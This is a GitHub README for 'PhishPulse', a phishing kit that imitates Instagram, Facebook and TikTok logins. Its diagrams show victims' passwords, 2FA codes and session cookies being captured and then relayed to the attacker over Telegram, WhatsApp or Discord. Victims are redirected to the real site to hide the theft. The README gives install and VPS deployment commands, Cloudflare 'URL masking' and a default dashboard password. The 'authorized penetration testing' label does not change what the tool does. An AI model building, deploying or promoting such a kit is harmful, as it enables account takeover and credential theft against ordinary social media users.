<p align="center">
  <img src="/assets/PhishPulse.png" alt="PhishPulse Logo" width="100%" />
</p>

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=700&size=40&duration=3000&pause=1000&color=00FF88&center=true&vCenter=true&width=500&lines=PHISHPULSE+v1.0;Advanced+Social+Engineering+Suite;Instagram+|+Facebook+|+TikTok;RReal-Time+Intelligence+Platform" />
    <source media="(prefers-color-scheme: light)" srcset="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=700&size=40&duration=3000&pause=1000&color=009944&center=true&vCenter=true&width=500&lines=PHISHPULSE+v1.0;Advanced+Social+Engineering+Suite;Instagram+|+Facebook+|+TikTok;Real-Time+Intelligence+Platform" />
    <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=700&size=40&duration=3000&pause=1000&color=00FF88&center=true&vCenter=true&width=500&lines=PHISHPULSE+v1.0;Advanced+Social+Engineering+Suite;Instagram+|+Facebook+|+TikTok;Real-Time+Intelligence+Platform" alt="PhishPulse" />
  </picture>
</p>

<p align="center">
  <a href="https://github.com/Athexblackhat/PhishPulse/releases">
    <img src="https://img.shields.io/github/v/release/Athexblackhat/PhishPulse?include_prereleases&style=for-the-badge&logo=github&labelColor=1a1a25&color=00ff88" alt="Release" />
  </a>
  <a href="https://github.com/Athexblackhat/PhishPulse/blob/main/LICENSE">
    <img src="https://img.shields.io/github/license/Athexblackhat/PhishPulse?style=for-the-badge&logo=opensourceinitiative&labelColor=1a1a25&color=ffaa00" alt="License" />
  </a>
  <a href="https://www.python.org/">
    <img src="https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&labelColor=1a1a25" alt="Python" />
  </a>
  <a href="https://www.php.net/">
    <img src="https://img.shields.io/badge/PHP-7.4%2B-777BB4?style=for-the-badge&logo=php&labelColor=1a1a25" alt="PHP" />
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Platforms-Linux%20%7C%20Windows%20%7C%20Termux-808080?style=for-the-badge&logo=linux&labelColor=1a1a25" alt="Platforms" />
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Status-Active-44cc11?style=for-the-badge&logo=statuspal&labelColor=1a1a25" alt="Status" />
  </a>
</p>

<p align="center">
  <a href="https://github.com/Athexblackhat/PhishPulse/stargazers">
    <img src="https://img.shields.io/github/stars/Athexblackhat/PhishPulse?style=social&logo=github" alt="Stars" />
  </a>
  <a href="https://github.com/Athexblackhat/PhishPulse/network/members">
    <img src="https://img.shields.io/github/forks/Athexblackhat/PhishPulse?style=social&logo=github" alt="Forks" />
  </a>
  <a href="https://github.com/Athexblackhat/PhishPulse/watchers">
    <img src="https://img.shields.io/github/watchers/Athexblackhat/PhishPulse?style=social&logo=github" alt="Watchers" />
  </a>
</p>

<br />

---

## 📑 Table of Contents

<details open>
<summary><b>Click to expand/collapse</b></summary>

1. [Overview](#-overview)
2. [Features](#-features)
3. [Architecture](#-architecture)
4. [System Design](#-system-design)
5. [Installation](#-installation)
6. [Configuration](#-configuration)
7. [Usage Guide](#-usage-guide)
8. [Dashboard Guide](#-dashboard-guide)
9. [API Reference](#-api-reference)
10. [Security](#-security)
11. [Deployment](#-deployment)
12. [Troubleshooting](#-troubleshooting)
13. [Contributing](#-contributing)
14. [Disclaimer](#-disclaimer)
15. [License](#-license)
16. [Credits](#-credits)

</details>

---

## 📖 Overview

### What is PhishPulse?

PhishPulse is a **comprehensive security research framework** designed for authorized penetration testing and security assessments. It provides a unified interface for testing social media authentication mechanisms across multiple platforms with real-time verification, session capture, and intelligence gathering capabilities.

### Why PhishPulse?

| Traditional Tools | PhishPulse v1.0 |
|-------------------|-----------------|
| Single platform support | **3 platforms** (IG, FB, TT) |
| No real-time feedback | **Live terminal + dashboard** |
| Manual data collection | **Automated JSON storage** |
| Basic logging | **Structured intelligence** |
| No notifications | **Telegram + WhatsApp + Discord** |
| Static reporting | **Animated analytics dashboard** |
| Single session | **Multi-user concurrent tracking** |

### Key Statistics

```mermaid
pie title Platform Support Distribution
    "Instagram API" : 40
    "Facebook API" : 30
    "TikTok API" : 30
```

## Dashboard Features

```mermaid
mindmap
  root((PhishPulse Dashboard))
    Real-Time Updates
      Auto-refresh 2s
      Live counters
      Animated stats
    Data Views
      Success tab
      Failed tab
      2FA Pending tab
      Analytics tab
    Visual Elements
      ASCII art banner
      Particle effects
      Glassmorphism UI
      Neon glow effects
    Actions
      Copy credentials
      Delete entries
      Export data
      Search/Filter
    Security
      Password protected
      Session management
      Tamper detection
```

## 🏗️ Architecture

```mermaid
graph TB
    subgraph "User Layer"
        A[Attacker Terminal]
        B[Web Browser - Dashboard]
    end
    
    subgraph "Victim Layer"
        C[Victim Browser]
    end
    
    subgraph "Application Layer"
        D[Flask Web Server<br/>port 8080]
        E[PHP Dashboard<br/>port 8888]
    end
    
    subgraph "Core Engine"
        F[Instagram Handler]
        G[Facebook Handler]
        H[TikTok Handler]
    end
    
    subgraph "External APIs"
        I[(Instagram API)]
        J[(Facebook API)]
        K[(TikTok API)]
        L[(IP Geolocation API)]
        M[(URL Shortener API)]
    end
    
    subgraph "Notification Layer"
        N[Telegram Bot]
        O[WhatsApp Twilio]
        P[Discord Webhook]
    end
    
    subgraph "Storage Layer"
        Q[(JSON Files)]
        R[(Log Files)]
    end
    
    C -->|HTTPS Request| D
    D --> F
    D --> G
    D --> H
    F --> I
    G --> J
    H --> K
    D --> L
    D --> M
    D --> Q
    D --> R
    D --> N
    D --> O
    D --> P
    A --> D
    A --> E
    B --> E
    E --> Q
```

## Component Interaction Diagram

```mermaid
sequenceDiagram
    participant V as Victim
    participant F as Flask App
    participant H as Platform Handler
    participant A as Platform API
    participant D as Dashboard
    participant T as Telegram
    
    V->>F: GET / (Login Page)
    F->>F: Create Session
    F->>D: Log Visitor
    F-->>V: Render Login HTML
    
    V->>F: POST /api/login (credentials)
    F->>H: login(username, password)
    H->>A: HTTP Request
    A-->>H: Response
    H-->>F: Result + Cookies
    
    alt Success
        F->>D: Save Victim Data
        F->>T: Send Notification
        F-->>V: Redirect to real site
    else 2FA Required
        F->>D: Save 2FA Pending
        F-->>V: Show 2FA Page
        V->>F: POST /api/2fa (code)
        F->>H: verify_2fa(code)
        H->>A: Verify Request
        A-->>H: Session Cookies
        H-->>F: Result + Profile
        F->>D: Update Victim
        F->>T: Send Notification
        F-->>V: Redirect to real site
    else Failed
        F->>D: Log Failed
        F-->>V: Show Error
    end
```

## Request Processing Pipeline

```mermaid
flowchart LR
    A[Incoming Request] --> B{Session Exists?}
    B -->|No| C[Create Session]
    B -->|Yes| D[Load Session]
    C --> E[Generate Session ID]
    E --> D
    D --> F{Route Type}
    F -->|GET /| G[Serve Login Page]
    F -->|POST /api/login| H[Process Login]
    F -->|POST /api/2fa| I[Process 2FA]
    G --> J[Log Visitor]
    H --> K[Platform Handler]
    I --> K
    K --> L{API Response}
    L -->|Success| M[Save + Notify]
    L -->|2FA| N[Return 2FA Page]
    L -->|Failed| O[Log Error]
    M --> P[Send to Dashboard]
    P --> Q[Send Telegram/WhatsApp]
```

## Data Storage Schema

```mermaid
erDiagram
    VICTIMS {
        int id PK
        string platform
        string username
        string password
        string email
        string phone
        string full_name
        int followers
        bool is_verified
        json cookies
        string country
        string city
        string isp
        bool is_vpn
        string ip_address
        string user_agent
        string status
        datetime timestamp
    }
    
    VISITORS {
        int id PK
        string session_id
        string ip_address
        string user_agent
        string country
        string city
        datetime timestamp
    }
    
    SESSIONS {
        string session_id PK
        string platform
        string ip_address
        string country
        string status
        json attempts
        datetime start_time
        datetime last_activity
    }
    
    VICTIMS ||--o{ SESSIONS : "belongs to"
    VISITORS ||--o{ SESSIONS : "creates"
```

## Quick Install

```
git clone https://github.com/Athexblackhat/PhishPulse.git
cd PhishPulse
chmod +x *
./run.sh
```

## Manual Install

### Linux (Ubuntu/Debian)

```
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip php-cli php-json php-curl git curl
git clone https://github.com/Athexblackhat/PhishPulse.git
cd PhishPulse
pip3 install -r requirements.txt
cp .env.example .env
bash run.sh
```

## Dependency Tree
```mermaid
graph TD
    A[PhishPulse v2.0] --> B[Python Packages]
    A --> C[System Packages]
    A --> D[External Services]
    
    B --> B1[flask >= 3.0.0]
    B --> B2[requests >= 2.31.0]
    B --> B3[colorama >= 0.4.6]
    B --> B4[pytz >= 2024.1]
    B --> B5[python-dotenv >= 1.0.0]
    
    C --> C1[Python 3.8+]
    C --> C2[PHP 7.4+]
    C --> C3[Git]
    C --> C4[Curl]
    
    D --> D1[Instagram API]
    D --> D2[Facebook API]
    D --> D3[TikTok API]
    D --> D4[IP Geolocation]
    D --> D5[URL Shortener]
    D --> D6[Telegram Bot]
    D --> D7[Twilio API]
```
## Configuration Flow
```mermaid
    flowchart TD
    A[Start] --> B{.env exists?}
    B -->|Yes| C[Load .env]
    B -->|No| D[Use defaults]
    C --> E[Validate config]
    D --> E
    E --> F{Platform valid?}
    F -->|Yes| G[Load platform handler]
    F -->|No| H[Fallback: instagram]
    G --> I[Initialize app]
    H --> I
    I --> J[Start server]
```
## Platform-Specific Features

```mermaid
graph TB
    subgraph "Instagram"
        IG1[Login: email/phone/username]
        IG2[2FA: SMS/WhatsApp/Authenticator]
        IG3[Profile: email, phone, followers]
        IG4[Cookies: sessionid, csrftoken]
    end
    
    subgraph "Facebook"
        FB1[Login: email/phone]
        FB2[2FA: SMS/Authenticator]
        FB3[Profile: email, name, friends]
        FB4[Cookies: c_user, xs, fr]
    end
    
    subgraph "TikTok"
        TT1[Login: Web + App API]
        TT2[2FA: SMS/Email]
        TT3[Profile: email, followers, videos]
        TT4[Cookies: sessionid, tt_webid]
    end
```

## 📊 Dashboard Guide

```
# Terminal
bash run.sh

# Terminal 2: PHP Dashboard
php -S localhost:8888 -t dashboard/
```
Access: http://localhost:8888/dashboard.php
Password: athex123

## Dashboard Features

```mermaid
graph LR
    subgraph "Data Display"
        A1[Victim Cards]
        A2[Session Cards]
        A3[Statistics]
        A4[Analytics]
    end
    
    subgraph "Interactions"
        B1[Copy Credentials]
        B2[Delete Entries]
        B3[Search/Filter]
        B4[Export Data]
    end
    
    subgraph "Real-Time"
        C1[Live Counters]
        C2[Auto Refresh]
        C3[Sound Alerts]
        C4[Toast Notifications]
    end
    
    subgraph "Visual"
        D1[Particle Effects]
        D2[Glassmorphism]
        D3[Neon Glow]
        D4[ASCII Banner]
    end
```

## Security Layers

```mermaid

mindmap
  root((Security Layers))
    Application Security
      Anti-theft protection
      Author verification
      Watermark encoding
      Tamper detection
    Data Security
      Local storage only
      JSON file encryption ready
      Automatic log rotation
      Session isolation
    Network Security
      HTTPS tunnel support
      VPN detection
      Proxy identification
    Access Control
      Dashboard password
      Session timeout
      Input sanitization
```

## 🚀 Deployment

```mermaid
graph TB
    A[PhishPulse] --> B{Deployment Type}
    B --> C[Local Testing]
    B --> D[Cloudflare Tunnel]
    B --> E[VPS Deployment]
    
    C --> C1[localhost:8080]
    C --> C2[No external access]
    
    D --> D1[cloudflared tunnel]
    D --> D2[Public HTTPS URL]
    D --> D3[URL masking]
    
    E --> E1[Nginx reverse proxy]
    E --> E2[Systemd service]
    E --> E3[24/7 operation]
```

## VPS Deployment
```
# SSH into VPS
ssh root@your-vps-ip

# Install dependencies
apt update && apt install -y python3 python3-pip php-cli nginx git

# Clone repository
git clone https://github.com/Athexblackhat/PhishPulse.git /opt/phishpulse
cd /opt/phishpulse

# Install Python packages
pip3 install -r requirements.txt

# Create systemd service
cat > /etc/systemd/system/phishpulse.service << 'EOF'
[Unit]
Description=PhishPulse Service
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/phishpulse
Environment=PHISH_PLATFORM=instagram
Environment=PORT=8080
ExecStart=/usr/bin/python3 /opt/phishpulse/app.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Start service
systemctl daemon-reload
systemctl enable phishpulse
systemctl start phishpulse
```


## 👤 Author

<table> <tr> <td align="center"> <a href="https://github.com/Athexblackhat"> <img src="https://github.com/Athexblackhat.png" width="100px;" alt="ATHEX BLACK HAT"/> <br /> <sub><b>ATHEX BLACK HAT</b></sub> </a> <br /> <a href="https://github.com/Athexblackhat" title="GitHub">🐙 GitHub</a> </td> </tr> </table>
